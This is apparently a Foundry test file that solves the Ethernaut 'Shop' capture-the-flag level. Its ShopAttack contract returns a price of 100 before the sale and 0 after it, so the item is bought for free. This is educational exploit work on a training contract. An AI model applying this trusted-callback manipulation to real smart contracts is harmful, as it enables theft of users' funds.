// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Shop, ShopFactory} from "ethernaut/levels/ShopFactory.sol";

contract ShopLevel is SetUpLevelTest {
    Shop internal shop;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0 ether;
        playerBalance = 0 ether;
        level = address(new ShopFactory());
        super.setUp();
        shop = Shop(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        ShopAttack shopAttack = new ShopAttack(address(shop));
        shopAttack.buy();
        vm.stopPrank();
    }
}

contract ShopAttack {
    Shop internal shop;

    constructor(address _target) {
        shop = Shop(_target);
    }

    function buy() public {
        shop.buy();
    }

    function price() public view returns (uint256 ret) {
        if (!shop.isSold()) {
            ret = 100;
        } else {
            ret = 0;
        }
    }
}
